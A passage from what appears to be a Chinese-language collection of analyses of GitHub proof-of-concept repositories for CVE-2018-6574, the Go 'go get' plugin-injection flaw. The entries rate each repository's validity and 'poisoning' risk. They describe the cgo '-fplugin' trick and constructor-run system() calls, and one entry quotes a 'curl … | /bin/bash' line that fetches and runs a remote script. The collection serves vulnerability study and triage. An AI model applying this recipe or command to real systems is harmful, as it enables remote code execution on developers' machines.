CVE-2018-6574 允许攻击者通过控制`go get`获取的代码仓库，利用gcc/clang插件机制注入恶意代码，从而在编译时执行任意命令。 

**漏洞利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目包含一个C文件 (`attack.c`) 和一个Go文件 (`main.go`)。
2.  `attack.c` 文件包含在编译时执行任意命令的代码。在这个例子中，它执行 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c`。这个命令可能用于漏洞评分或执行恶意操作。
3.  `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 注释指示 `go` 编译器使用 `attack.c` 生成的插件。 这会强制 `go` 在构建过程中加载并执行该插件。
4.  当用户使用易受攻击的 Go 版本运行 `go get <attacker_repo>`时，`go` 命令会自动下载并构建恶意项目。
5.  由于 `-fplugin` 标志未被正确过滤，`go` 编译器将加载并执行恶意插件，从而在用户的系统上执行攻击者指定的任意命令。

**有效性评估：**

提供的PoC代码有效，它演示了如何在 `go get` 命令执行期间利用 gcc/clang 插件功能执行任意命令。

**投毒风险评估：**

在此特定仓库中，未发现明显的投毒代码。`attack.c` 中执行的命令 `/usr/local/bin/score 9d8dad5f-cda0-45bd-b004-219ca9c1774c` 本身就是漏洞验证的一部分，旨在证明可以执行任意命令。没有迹象表明作者试图隐藏其他恶意代码或功能。因此，投毒风险评估为 0%。

**总结：**

该漏洞利用了 `go get` 命令在处理 gcc/clang 插件参数时的不当输入验证。攻击者可以通过创建一个包含恶意插件的Go项目来利用此漏洞，当用户使用易受攻击的Go版本获取并构建该项目时，该插件将被加载并执行，从而导致远程命令执行。

**项目地址:** [faqihudin13/CVE-2018-6574](https://github.com/faqihudin13/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #15

**来源**: [CVE-2018-6574-frozenkp_CVE-2018-6574.md](../2018/CVE-2018-6574-frozenkp_CVE-2018-6574.md)

## CVE-2018-6574-go-get远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 需要目标机器安装受影响版本的Go，且执行`go get`命令

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者在受害者构建源代码时执行远程命令。漏洞原因是 `go get` 命令没有正确过滤 gcc 或 clang 插件的参数 `-fplugin=` 和 `-plugin=`。攻击者可以通过构造包含恶意插件选项的 Go 项目，诱导受害者使用 `go get` 命令获取并构建该项目，从而执行任意命令。

**有效性：**

根据漏洞描述和提供的POC代码，漏洞利用的有效性较高。POC代码通过 `#cgo` 指令设置编译选项，利用 `-fplugin` 选项加载恶意的动态链接库，从而在编译时执行预定义的命令。根据`pentesterlab.com/exercises/cve-2018-6574`中的描述，攻击者可以诱骗用户安装恶意包从而执行代码。

**投毒风险：**

该仓库中存在一定的投毒风险，但风险较低。`README.md` 中说明了漏洞利用方式，并明确表示仅用于评估目的。虽然包含了一个`curl`命令，但该命令相对简单，易于检测，攻击者可能通过其他方式进行恶意行为，例如植入更隐蔽的后门程序。该curl命令从外部源获取并执行脚本，存在被篡改的可能。综合考虑，投毒风险大约为10%。

**利用方式：**

1.  攻击者创建一个包含恶意代码的Go项目，该项目使用`#cgo`指令，在编译选项中包含`-fplugin=`或`-plugin=`，指向一个包含恶意代码的动态链接库（如 `calc.so` 或 `calc_darwin.so`）。
2.  攻击者将该项目托管在一个公开的Git仓库中。
3.  攻击者诱导受害者使用受影响版本的Go执行`go get <攻击者仓库地址>`命令。
4.  当`go get`命令构建项目时，会执行恶意动态链接库中的代码，从而实现远程命令执行。
5.  POC中，`calc_darwin.so`（或者其他平台的 `.so` 文件）被设计为执行 `curl newton.cycarrier:8002 | /bin/bash`，这意味着它会从攻击者的服务器下载并执行一个Shell脚本。

**项目地址:** [frozenkp/CVE-2018-6574](https://github.com/frozenkp/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #16

**来源**: [CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md](../2018/CVE-2018-6574-hasharmujahid_CVE-2018-6574-go-get-RCE.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本，并使用`go get`命令获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574漏洞允许攻击者在受害者的系统上执行任意命令。攻击者可以通过创建一个包含恶意代码的Go包来实现这一点。当受害者使用`go get`命令获取并构建该包时，恶意代码将被执行。漏洞利用方式如下：

1.  **利用方式:**
    *   攻击者创建一个包含恶意`attack.c`和`main.go`文件的Go包。
    *   `attack.c` 文件包含在编译时执行系统命令的代码，例如，调用 `system("/usr/local/bin/score 173b6b3c-5d6a-4237-b67f-e97ff771ae51")`。
    *   `main.go` 文件使用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，指示 `go build` 使用 `attack.so` 作为 gcc 插件。这允许攻击者在构建过程中执行 `attack.c` 中的代码。
    *   攻击者将此Go包托管在公共代码仓库（例如GitHub）上。
    *   攻击者诱骗受害者使用 `go get` 命令获取并构建该恶意包。例如：`go get github.com/attacker/malicious_package`。
    *   当受害者执行 `go get` 命令时，`attack.c` 中的恶意代码将被执行，从而允许攻击者在受害者的系统上执行任意命令。

2.  **有效性:**
    *   提供的PoC代码有效。`attack.c`文件编译为共享库，并通过`main.go`中的`cgo`指令在构建时加载执行，从而实现远程命令执行。

3.  **投毒风险:**
    *   此仓库中未发现作者隐藏的投毒代码。该PoC的目的是演示漏洞利用，而不是在正常功能之外执行恶意行为。`attack.c` 中执行的 `system` 命令可以被修改为任何攻击者想要执行的命令，但目前的代码仅调用了一个看起来是用于获取分数的命令 `score`。 投毒风险为0%。

**项目地址:** [hasharmujahid/CVE-2018-6574-go-get-RCE](https://github.com/hasharmujahid/CVE-2018-6574-go-get-RCE)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #17

**来源**: [CVE-2018-6574-iNoSec2_cve-2018-6574.md](../2018/CVE-2018-6574-iNoSec2_cve-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致任意代码执行

**影响版本:** Go < 1.8.7, Go 1.9.x < 1.9.4, Go 1.10 pre-releases < Go 1.10rc2

**利用条件:** 用户使用go get命令获取包含恶意代码的包

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者在受害者使用 `go get` 命令获取恶意 Go 包时执行任意代码。该漏洞的根源在于 `go get` 命令在构建过程中没有正确过滤 gcc/clang 的插件参数，导致攻击者可以通过 `-fplugin=` 或 `-plugin=` 参数指定恶意插件，从而执行任意代码。

**有效性：**

提供的 POC 代码是有效的，它通过创建一个包含恶意 C 代码（`2018.c`）的 Go 包来实现远程代码执行。恶意 C 代码使用 `__attribute__((constructor))` 在库加载时自动执行 `malicious()` 函数，该函数执行 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建时加载 `attack.so` 插件（通过编译 `2018.c` 得到）。

**投毒风险：**

该POC代码本身就是一个漏洞演示，旨在展示如何利用该漏洞执行任意命令。`2018.c` 中执行的 `/usr/local/bin/score 0634e7ff-26c1-4d5e-817e-a214be2151b7` 命令是预期的payload。该代码仓库的目的是演示漏洞，而不是为了植入后门。因此投毒风险评估为0%。

**利用方式：**

1.  **创建恶意Go包:** 攻击者创建一个包含恶意 C 代码和 Go 代码的 Go 包。恶意 C 代码编译成一个共享库（`attack.so`）。
2.  **上传恶意Go包:** 攻击者将恶意 Go 包上传到公共代码托管平台（如 GitHub）。
3.  **诱骗受害者:** 攻击者诱骗受害者使用 `go get` 命令获取恶意 Go 包。
4.  **执行恶意代码:** 当受害者使用 `go get` 命令获取恶意 Go 包时，Go 编译器会加载恶意共享库，并执行其中的恶意代码。

**缓解措施：**

*   升级 Go 版本到受影响版本之外（>= 1.8.7, >= 1.9.4, >= 1.10rc2）。
*   避免使用来自不受信任来源的 Go 包。


**项目地址:** [iNoSec2/cve-2018-6574](https://github.com/iNoSec2/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #18

**来源**: [CVE-2018-6574-jahwni_CVE-2018-6574.md](../2018/CVE-2018-6574-jahwni_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的Go版本执行 `go get` 命令来获取包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过 `go get` 命令执行远程代码。攻击者可以创建一个包含恶意代码的Go包，并将该包托管在公开的存储库中。当受害者使用 `go get` 命令获取该包时，恶意代码将在构建过程中执行。利用方式为在包中利用 gcc 或 clang 的插件功能（`-fplugin=` 或 `-plugin=` 参数），在编译时执行任意命令。

提供的PoC代码包含两个文件：`attack.c` 和 `main.go`。
*   `attack.c` 文件包含一个名为 `malicious` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score 356f5d20-43e8-4a8c-b024-f1e42ec7f7f5`。`__attribute__((constructor))` 确保 `malicious` 函数在共享库加载时自动执行。
*   `main.go` 文件使用 cgo 特性。`// #cgo CFLAGS: -fplugin=./attack.so`  指示 `go` 编译器在构建过程中将 `attack.so` 作为 gcc/clang 插件加载。由于 `attack.so` 包含 `malicious` 函数，因此当 `go get` 获取并构建这个包时，`malicious` 函数将被执行，从而实现远程命令执行。

有效性：提供的PoC代码是有效的，如果目标Go版本存在漏洞，则可以成功执行任意命令。

投毒风险：提供的 PoC 仅仅是漏洞演示，执行了一个固定的命令。从提供的 `attack.c` 和 `main.go` 代码来看，并没有发现隐藏的、额外的恶意代码或者后门。作者意图是演示漏洞，而不是进行恶意攻击，风险较低。

利用方式：
1.  攻击者创建一个包含恶意代码的Go包，如提供的PoC代码。
2.  攻击者将该包托管在公开的存储库中。
3.  攻击者诱使受害者使用存在漏洞的Go版本执行 `go get <attacker_repo>` 命令来获取该包。
4.  当受害者执行 `go get` 命令时，恶意代码将在构建过程中执行，从而实现远程命令执行。

**项目地址:** [jahwni/CVE-2018-6574](https://github.com/jahwni/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #19

**来源**: [CVE-2018-6574-jftierno_-CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_-CVE-2018-6574.md)

## CVE-2018-6574

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致完全控制受影响的系统

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 受害者使用存在漏洞的 Go 版本，并且运行 `go get` 获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。具体利用方式如下：

1.  **攻击者创建恶意 Go 包：** 攻击者创建一个包含恶意代码的 Go 包，利用 gcc 或 clang 插件特性。 在提供的POC代码中,attack.c 文件定义了一个 `malicious()` 函数，该函数被声明为 `__attribute__((constructor))`，这意味着它会在程序加载时自动执行。该函数会执行 `system("/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1")` 命令。这表明攻击者试图执行一个特定的程序 `/usr/local/bin/score`，并传递一个特定的ID作为参数。

2.  **诱导受害者获取恶意包：** 攻击者诱导受害者使用 `go get` 命令获取该恶意包。这可以通过多种方式实现，例如通过社会工程学攻击，或者将恶意包伪装成有用的工具库。

3.  **构建时执行恶意代码：** 当受害者使用 `go get` 命令获取并构建恶意包时，Go 会调用 gcc 或 clang 来编译代码。由于存在漏洞，Go 没有正确地过滤 `-fplugin=` 和 `-plugin=` 参数，导致 gcc 或 clang 加载并执行攻击者提供的恶意插件，从而执行攻击者预先设定的恶意代码。

**有效性分析：**
提供的POC代码通过构造一个包含constructor属性的C代码，在编译时自动执行恶意命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。如果攻击者能够控制 go get 获取的源码，并在其中包含类似的代码，那么这个POC是有效的。

**投毒风险分析：**
提供的POC代码本身没有明显的投毒行为，它只是简单地执行一个命令。是否包含投毒代码需要分析 go get 获取的整个代码仓库，而不仅仅是 attack.c 这个文件。根据目前的信息，无法确定是否存在投毒风险。
提供的 attack.c 代码直接执行预设的命令，没有发现隐藏恶意行为的迹象。假设作者仅提供了已验证可复现漏洞的代码，所以判定投毒风险为0%

**利用方式总结：**
攻击者利用该漏洞，主要是利用了`go get`命令在构建过程中的不安全行为，通过`gcc`或`clang`的插件机制执行恶意代码，达到远程代码执行的目的。攻击的关键在于诱使受害者获取并构建包含恶意插件的Go包。

**项目地址:** [jftierno/-CVE-2018-6574](https://github.com/jftierno/-CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #20

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574-2.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574-2.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 用户使用受影响的Go版本执行 `go get` 命令，并下载包含恶意代码的包。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574 允许攻击者通过 `go get` 命令执行远程代码。漏洞原因是 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。

**有效性：**

提供的 POC 代码 `main.go` 展示了如何利用该漏洞。代码通过 `#cgo CFLAGS: -fplugin=./attack.so` 指令引入一个恶意的 gcc 插件 `attack.so`。当 `go get` 或 `go build` 执行此代码时，gcc/clang 会尝试加载并执行 `attack.so`，从而实现远程命令执行。

**投毒风险：**

由于 POC 代码中引用了外部的 `attack.so` 文件，因此存在投毒风险。虽然代码本身只是声明和调用了一个简单的函数，但是实际的恶意代码存在于 `attack.so` 中。攻击者可以将恶意代码注入到 `attack.so` 中，从而在用户构建项目时执行任意命令。如果用户下载并使用了包含此 `main.go` 和恶意的 `attack.so` 的代码仓库，那么就会受到攻击。投毒风险评估为10%，主要因为代码本身依赖外部文件，增加了复杂性，也更容易被发现。

**利用方式：**

1.  攻击者创建一个包含恶意 `main.go` 和 `attack.so` 的 Go 项目。
2.  `main.go` 包含 `#cgo CFLAGS: -fplugin=./attack.so` 指令。
3.  `attack.so` 包含攻击者想要执行的恶意代码。
4.  攻击者将该项目托管在公共代码仓库（例如 GitHub）上。
5.  攻击者诱骗受害者使用受影响的 Go 版本执行 `go get <攻击者仓库地址>` 命令。
6.  `go get` 命令下载并构建项目，触发 gcc/clang 加载 `attack.so`。
7.  `attack.so` 中的恶意代码被执行，攻击成功。

搜索引擎结果中的 "pentesterlab.com/exercises/cve-2018-6574" 链接提供了一个练习环境，可以用来复现和理解该漏洞。

**总结：**

CVE-2018-6574 是一个严重的安全漏洞，允许攻击者利用 `go get` 命令执行任意代码。为了避免受到攻击，请确保使用最新版本的 Go，并避免下载和构建来自不可信来源的 Go 项目。

**项目地址:** [jftierno/CVE-2018-6574-2](https://github.com/jftierno/CVE-2018-6574-2)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #21

**来源**: [CVE-2018-6574-jftierno_CVE-2018-6574.md](../2018/CVE-2018-6574-jftierno_CVE-2018-6574.md)

## CVE-2018-6574-Go-远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器被完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标机器需要安装受影响版本的Go，并且执行`go get`命令拉取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-6574漏洞允许攻击者在`go get`命令执行期间，通过gcc或clang插件功能执行任意命令。攻击者可以创建一个包含恶意C代码的Go项目，该C代码在编译时被执行。 

**漏洞利用方式：**
1.  攻击者创建一个包含`attack.c`和`main.go`的恶意Go项目。
2.  `attack.c`包含将在编译时执行的恶意代码，例如，利用`system`函数执行任意命令。
3.  `main.go`使用`// #cgo CFLAGS: -fplugin=./attack.so`指示Go编译器使用`attack.so`作为gcc/clang插件。
4.  当用户使用`go get`命令下载并构建该恶意项目时，`attack.c`会被编译成`attack.so`，并作为插件加载，其中的恶意代码将被执行。

**有效性：**
提供的PoC代码是有效的。`attack.c`中的`malicious()`函数使用`system()`函数执行命令`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1`。`main.go`中的`// #cgo CFLAGS: -fplugin=./attack.so`指令使得在构建时加载`attack.so`，从而执行恶意代码。

**投毒风险：**
存在一定的投毒风险，风险占比约10%。虽然PoC的主要功能是演示漏洞利用，但攻击者可能在`attack.c`中添加额外的恶意代码，例如，植入后门、窃取敏感信息等。当前的PoC代码中`/usr/local/bin/score a321915f-37a6-465f-be95-ce9602f6a9e1` 命令比较可疑，如果`score` 命令的功能未知，那么存在潜在的风险。 此外攻击者可能在其他地方加入隐蔽的后门代码，增加了投毒的风险，所以评估投毒风险占比为10%。

**项目地址:** [jftierno/CVE-2018-6574](https://github.com/jftierno/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #22

**来源**: [CVE-2018-6574-lisu60_cve-2018-6574.md](../2018/CVE-2018-6574-lisu60_cve-2018-6574.md)

## CVE-2018-6574-go get 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致系统被完全控制

**影响版本:** < 1.8.7, 1.9.x < 1.9.4, 1.10 pre-releases < 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，且执行了`go get`命令来获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574允许攻击者利用`go get`命令执行任意代码。漏洞原理是由于受影响的Go版本在构建过程中没有正确过滤`-fplugin`和`-plugin`参数，攻击者可以在代码仓库中包含恶意的gcc/clang插件，当用户使用`go get`下载并构建该仓库时，恶意插件会被执行，从而实现远程命令执行。

**有效性分析：**
提供的POC代码是有效的，它演示了如何利用`-fplugin`选项执行代码。`attack.c`文件包含一个`malicious()`函数，该函数使用`system()`调用执行命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`。`attack.go`文件使用`#cgo CFLAGS: -fplugin=./attack.so`指令告诉go编译器在构建过程中包含该恶意插件。

**投毒风险分析：**
代码本身没有明显的投毒迹象。`attack.c`中执行的命令`/usr/local/bin/score cacd042c-6b75-4c9b-b52d-3ebb2f52932e`看起来像是一个示例或者测试命令，用于验证漏洞是否成功利用。虽然这个命令本身可能是无害的，但攻击者可以修改`attack.c`来执行任何他们想要的恶意命令，这才是真正的风险所在。所以说，从提供的代码来看，投毒的概率为0%，但是不代表攻击者不能进行投毒。

**利用方式分析：**
1.  攻击者创建一个包含恶意代码的Go项目，其中包括`attack.c`和`attack.go`文件，以及`go.mod`文件。
2.  攻击者将该项目托管在一个公开的代码仓库中（如GitHub）。
3.  攻击者诱骗目标用户使用`go get`命令下载并构建该项目。
4.  当目标用户执行`go get`命令时，Go编译器会读取`attack.go`文件中的`#cgo CFLAGS: -fplugin=./attack.so`指令，并将`attack.so`插件加载到构建过程中。
5.  `attack.so`插件中的`malicious()`函数会被执行，从而执行攻击者预先设定的恶意命令。

**项目地址:** [lisu60/cve-2018-6574](https://github.com/lisu60/cve-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #23

**来源**: [CVE-2018-6574-markisback_CVE-2018-6574.md](../2018/CVE-2018-6574-markisback_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的 Go 版本，并且执行了 `go get` 命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许在 `go get` 命令构建源代码时执行远程命令。 这是因为 Go 在处理 gcc 或 clang 插件功能时，未正确阻止 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个恶意的 Go 包，其中包含一个 `attack.c` 文件，该文件使用 `__attribute__((constructor))` 定义一个在加载时自动执行的函数 `malicious()`。这个函数会执行任意命令，例如本例中的 `/usr/local/bin/score 9ba57f82-9a67-46fe-885b-682c886cb726`。 `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.c` 文件生成的动态链接库 `attack.so`。 当用户使用 `go get` 命令获取并构建这个恶意包时，`attack.so` 会被加载，`malicious()` 函数会被自动执行，从而导致远程命令执行。

**有效性：**提供的 POC 代码有效。当目标系统使用存在漏洞的 Go 版本并执行 `go get` 命令时，攻击者可以通过托管包含恶意代码的仓库来利用此漏洞。

**投毒风险：**提供的代码本身就是一个漏洞利用程序，而非被投毒的代码。此仓库没有发现额外的、作者隐藏的投毒代码。 该POC的主要目标是演示漏洞而不是隐藏恶意代码。因此，投毒风险评估为0%。

**利用方式：**
1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 文件的 Go 包。
2.  `attack.c` 文件包含一个在加载时自动执行的 `malicious()` 函数，用于执行任意命令。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令来编译和链接 `attack.so`。
4.  攻击者将恶意 Go 包托管在一个公开可访问的仓库中。
5.  受害者使用 `go get` 命令获取并构建这个恶意包。
6.  在构建过程中，`attack.so` 被加载，`malicious()` 函数被执行，从而导致远程命令执行。

**项目地址:** [markisback/CVE-2018-6574](https://github.com/markisback/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #24

**来源**: [CVE-2018-6574-memmas_CVE-2018-6574.md](../2018/CVE-2018-6574-memmas_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程代码执行

**影响应用:** Go

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要运行受影响的Go版本，并且执行`go get`命令获取恶意代码仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞允许攻击者通过 `go get` 命令执行任意代码。该漏洞源于 Go 在构建过程中没有正确过滤 gcc 或 clang 的插件参数（`-fplugin=` 和 `-plugin=`）。攻击者可以构造包含恶意 `C` 代码的 Go 项目，利用 `cgo` 特性，在 `go get` 下载并构建该项目时，`C` 代码会被编译并执行，从而实现远程命令执行。

**有效性：**
提供的 POC 代码有效。它包含一个 `exploit.c` 文件，其中定义了一个 `malicious()` 函数，该函数使用 `system()` 函数执行命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417`。`__attribute__((constructor))` 确保 `malicious()` 函数在加载动态链接库时自动执行。
`main.go` 文件使用 `cgo` 特性，将 `exploit.so` 作为插件编译到 Go 程序中。当 `go get` 获取并构建这个项目时，`exploit.c` 会被编译成动态链接库，并在程序加载时执行 `malicious()` 函数，从而执行预定的恶意命令。

**投毒风险：**
根据提供的代码，投毒风险为 0%。`exploit.c` 中执行的命令 `/usr/local/bin/score 3f9f4915-ab08-4227-9eba-830c2b3ac417` 明确定义，没有发现隐藏的恶意代码或者其他未知的行为。此仓库只是作为POC验证，触发执行的是给定的命令。

**利用方式：**
1.  **创建恶意 Go 项目：** 攻击者创建一个包含 `exploit.c` 和 `main.go` 文件的 Go 项目。`exploit.c` 包含要执行的恶意代码，`main.go` 使用 `cgo` 特性加载 `exploit.so`。
2.  **托管恶意项目：** 将恶意 Go 项目托管在公共代码仓库（例如 GitHub）上。
3.  **诱导受害者执行 `go get`：** 攻击者诱导受害者在其系统上执行 `go get <恶意项目URL>` 命令。
4.  **远程命令执行：** 当受害者执行 `go get` 命令时，Go 会下载并构建恶意项目。构建过程中，`exploit.c` 会被编译并执行，从而在受害者系统上执行攻击者预设的恶意命令。

**项目地址:** [memmas/CVE-2018-6574](https://github.com/memmas/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #25

**来源**: [CVE-2018-6574-mux0x_CVE-2018-6574.md](../2018/CVE-2018-6574-mux0x_CVE-2018-6574.md)

## CVE-2018-6574 Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在构建过程中执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统使用受影响的Go版本，并且执行`go get`命令获取恶意代码。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 允许通过`go get`命令执行远程命令，利用了 gcc/clang 插件功能未正确过滤 `-fplugin=` 和 `-plugin=` 参数。攻击者可以创建一个包含恶意代码的Go项目，并在项目的CGO指令中指定恶意的插件。当受害者使用受影响的Go版本通过`go get`获取并构建该项目时，指定的恶意插件会被执行，从而导致远程命令执行。

分析提供的POC代码：

*   `attack.c`：这是一个 C 源代码文件，定义了一个名为 `exploit` 的函数，该函数使用 `system` 函数执行命令 `/usr/local/bin/score afd78b87-2130-4509-be41-e2bc661c338e`。`__attribute__((constructor))` 使得 `exploit` 函数在共享库加载时自动执行。
*   `main.go`：这是一个 Go 源代码文件，它使用 CGO（C Go 接口）来调用 C 代码。`// #cgo CFLAGS: -fplugin=./attack.so` 指令告诉 Go 编译器在构建过程中使用 `attack.so` 作为 gcc/clang 的插件。`attack.so` 是由 `attack.c` 编译生成的共享库。当 `go get` 构建该项目时，会编译 `attack.c` 生成 `attack.so`，然后将其作为插件加载，从而执行 `exploit` 函数中的命令。

**有效性：**

该POC代码有效。通过 `go get` 命令获取并构建包含上述代码的项目，可以触发远程命令执行。

**投毒风险：**

代码本身的功能是明确的：执行一个特定的命令。**并没有隐藏任何其他的后门代码或者恶意行为**。因此，投毒风险为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意 `attack.c` 和 `main.go` 的 Go 项目。
2.  攻击者将该项目托管在公共代码仓库（如 GitHub）。
3.  攻击者诱导受害者使用受影响的 Go 版本执行 `go get <attacker's repository>` 命令。
4.  受害者的 Go 工具链在构建项目时，会加载 `attack.so` 插件，从而执行攻击者指定的任意命令。

**项目地址:** [mux0x/CVE-2018-6574](https://github.com/mux0x/CVE-2018-6574)

**漏洞详情:** [CVE-2018-6574](https://nvd.nist.gov/vuln/detail/CVE-2018-6574)

---

## POC #26

**来源**: [CVE-2018-6574-paulogmota_CVE-2018-6574.md](../2018/CVE-2018-6574-paulogmota_CVE-2018-6574.md)

## CVE-2018-6574 - Go "go get" 远程命令执行

**漏洞编号:** CVE-2018-6574

**漏洞类型:** 远程命令执行

**影响应用:** Go

**危害等级:** 高危，允许攻击者在目标系统上执行任意代码

**影响版本:** Go before 1.8.7, Go 1.9.x before 1.9.4, and Go 1.10 pre-releases before Go 1.10rc2

**利用条件:** 目标系统需要安装存在漏洞的Go版本，并运行 `go get` 命令尝试获取恶意代码仓库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-6574 漏洞存在于 Go 语言的 `go get` 命令中，允许远程命令执行。攻击者可以通过创建一个包含恶意 `.c` 文件的 Go 项目，并利用 `// #cgo CFLAGS: -fplugin=./attack.so` 指令，在目标系统执行任意命令。

**利用方式：**

1.  攻击者创建一个包含 `main.go` 和 `attack.c`（编译后的 `attack.so`）的恶意 Go 项目，其中 `attack.c` 包含要执行的恶意代码。
2.  `attack.c` 文件使用 `__attribute__((constructor))`  修饰 `malicious()` 函数，使其在动态链接库加载时自动执行。
3.  `main.go` 文件使用 `#cgo CFLAGS: -fplugin=./attack.so` 指令，告诉 `go` 命令使用 `attack.so` 作为 GCC 插件。
4.  攻击者将该项目托管到 GitHub 等代码仓库。
5.  诱骗目标用户使用 `go get github.com/<your-handle>/<your-hepo>` 命令获取该项目。
